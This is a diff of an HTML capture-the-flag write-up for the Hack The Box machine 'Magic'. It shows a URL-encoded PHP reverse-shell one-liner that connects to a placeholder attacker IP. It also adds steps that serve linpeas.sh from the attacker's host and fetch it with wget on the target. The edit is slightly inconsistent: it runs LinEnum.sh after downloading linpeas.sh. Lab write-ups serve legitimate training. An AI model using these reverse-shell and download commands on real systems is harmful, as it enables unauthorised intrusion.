@@ -229,7 +229,6 @@ theseus@10.10.10.185: Permission denied (publickey).
 <p>lets redo the steps for uploading a shell and this time lets use this command</p>
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-r</span> <span class="s1">'$sock%3dfsockopen("ATTACKER IP",1234)%3bexec("/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263")%3b'</span>
 </code></pre></div></div>
-
 <p>and listen to on port 1234 with netcat.</p>
 
 <p>good, we have a shell. first thing, upgrading our shell is always a good habit.</p>
@@ -253,11 +252,26 @@ theseus@10.10.10.185: Permission denied (publickey).
 
 <h1 id="post-exploitation--root-own">Post Exploitation &amp; Root Own</h1>
 
-<p>lets run linux enumeration scripts like <a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a></p>
+<p>lets run linux enumeration scripts like <a href="">linpeas.sh</a></p>
 
 <p>downlowd the script and run</p>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span> <span class="o">--</span><span class="n">bind</span> <span class="n">ATTACKER</span> <span class="n">IP</span>
 </code></pre></div></div>
+<p>in same dir that the script is located.</p>
+
+<p>from theseuse box run the following:</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>theseus@ubuntu:~<span class="nv">$ </span>wget http://ATTACKER IP/linpeas.sh
+theseus@ubuntu:~<span class="nv">$ </span><span class="nb">chmod </span>777 linpeas.sh
+theseus@ubuntu:~<span class="nv">$ </span>./LinEnum.sh
+</code></pre></div></div>
+
+<p>wait for the result..</p>
+
+<p>and here looks like we got something interesting.</p>
+
+<p><img src="/assets/magic/10.png" alt="10" /></p>
+
+<p>let run this binary and see the output</p>
 
 </div>
 
